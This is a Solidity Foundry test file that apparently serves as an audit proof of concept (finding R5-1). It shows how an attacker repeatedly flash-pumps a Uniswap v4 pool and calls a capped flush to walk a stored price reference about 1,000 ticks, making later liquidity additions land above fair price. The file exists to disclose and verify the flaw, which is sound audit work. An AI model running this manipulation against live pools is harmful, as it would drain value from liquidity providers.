// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/console2.sol";
import {IntegrationBase} from "../integration/IntegrationBase.sol";
import {Token} from "../../src/Token.sol";
import {BondingCurve} from "../../src/BondingCurve.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";

/// Round 5 (3264ee0). R5-1: a capped _nearRef call stores the reference wherever the pool sits at that instant,
/// so an attacker who flash-pumps and flushes every REF_MAX_CATCHUP seconds walks the anchor 200 ticks per call
/// in its chosen direction, without holding the pump. Honest keeper flushes in between (dt < 120 s, price at fair)
/// store nothing, so they never pull it back.
contract AuditPoC5 is IntegrationBase {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    function _tick(Token tok) internal view returns (int24 t) {
        (, t,,) = manager.getSlot0(_poolKey(tok).toId());
    }

    function _gradWithBuckets() internal returns (Token tok) {
        BondingCurve c;
        (c, tok) = _launch(0, 0);
        quote.mint(sniper, 3_000 ether);
        _buy(c, sniper, 3_000 ether, 0);
        _graduate(c);
        _refReady(tok);
        vm.roll(vm.getBlockNumber() + 1);
        _swapExactInQuoteForToken(tok, trader1, 200 ether);
        for (uint256 i; i < 3; ++i) {
            vm.warp(vm.getBlockTimestamp() + 600);
            vm.roll(vm.getBlockNumber() + 1);
            lockedLP.flush(address(tok));
        }
    }

    function _pumpTo(Token tok, address who, int24 from, int256 want, int256 s) internal returns (uint256 spent) {
        while ((int256(_tick(tok)) - from) * s < want) {
            _swapExactInQuoteForToken(tok, who, 25 ether);
            spent += 25 ether;
        }
    }

    function _step(uint256 secs) internal {
        vm.warp(vm.getBlockTimestamp() + secs);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// keeper: seconds between honest keeper flushes inside each 120 s round (0 = no keeper). The attacker's
    /// transaction lands first in the block at the 120 s mark; the keeper's call in that same block does nothing.
    function _run(uint256 rounds, uint256 keeper) internal returns (int256 refOff, uint128 added, int256 offFair) {
        Token tok = _gradWithBuckets();
        int256 s = uint160(address(tok)) < uint160(address(quote)) ? int256(1) : int256(-1);
        int24 fair = _tick(tok);
        address att = makeAddr("att");
        _step(120);
        lockedLP.flush(address(tok)); // honest: anchor at fair
        for (uint256 i; i < rounds; ++i) {
            uint256 used;
            if (keeper != 0) {
                for (; used + keeper < 120; used += keeper) {
                    _step(keeper);
                    lockedLP.flush(address(tok));
                }
            }
            _step(120 - used);
            // attacker, one transaction: pump ~+1,200 ticks, flush (refused, capped -> anchor +200), dump
            _pumpTo(tok, att, fair, 1_200, s);
            assertEq(lockedLP.flush(address(tok)), 0, "refused: out of band");
            _swapExactInTokenForQuote(tok, att, tok.balanceOf(att));
            if (keeper != 0) lockedLP.flush(address(tok)); // keeper, same block, after the attacker
        }
        (int24 r,) = lockedLP.flushRef(address(tok));
        refOff = (int256(r) - fair) * s;
        _step(1);
        _pumpTo(tok, att, fair, refOff + 100, s);
        offFair = (int256(_tick(tok)) - fair) * s;
        added = lockedLP.flush(address(tok));
    }

    function _show(string memory tag, int256 r, uint128 a, int256 o) internal pure {
        console2.log(tag);
        console2.logInt(r);
        console2.log(a);
        console2.logInt(o);
    }

    function test_R5_1_cappedFlushWalksReference() public {
        uint256 snap = vm.snapshotState();
        (int256 r0, uint128 a0, int256 o0) = _run(0, 0);
        _show("baseline: ref-fair / added / pool-fair", r0, a0, o0);
        vm.revertToState(snap);
        (int256 r1, uint128 a1, int256 o1) = _run(5, 0);
        _show("5 rounds, no keeper", r1, a1, o1);
        vm.revertToState(snap);
        (int256 r2, uint128 a2, int256 o2) = _run(5, 60);
        _show("5 rounds, keeper every 60 s (attacker first at 120 s)", r2, a2, o2);
        vm.revertToState(snap);
        (int256 r3, uint128 a3, int256 o3) = _run(5, 30);
        _show("5 rounds, keeper every 30 s", r3, a3, o3);
        vm.revertToState(snap);
        (int256 r4, uint128 a4, int256 o4) = _run(5, 120);
        _show("5 rounds, keeper every 120 s (the documented web cron; attacker first in the block)", r4, a4, o4);
        assertGe(r4, 900, "2-min cron: anchor walked ~1000 ticks in 10 min");
        assertGt(a4, 0, "2-min cron: flush adds ~10% above fair");
        assertGe(r1, 900, "no keeper: anchor walked ~1000 ticks in 10 min");
        assertGt(a1, 0, "no keeper: flush adds ~10% above fair");
        // a keeper flushing at a resting price every < 120 s re-stores the anchor (ref == tick), so the attacker never
        // gets a capped call: the walk needs a quiet keeper (none, or >= 120 s apart).
        assertLt(r2, 200, "60 s keeper resets the anchor at fair");
        assertEq(a2, 0, "60 s keeper: pump refused");
        assertLt(r3, 200, "30 s keeper resets the anchor at fair");
    }
}
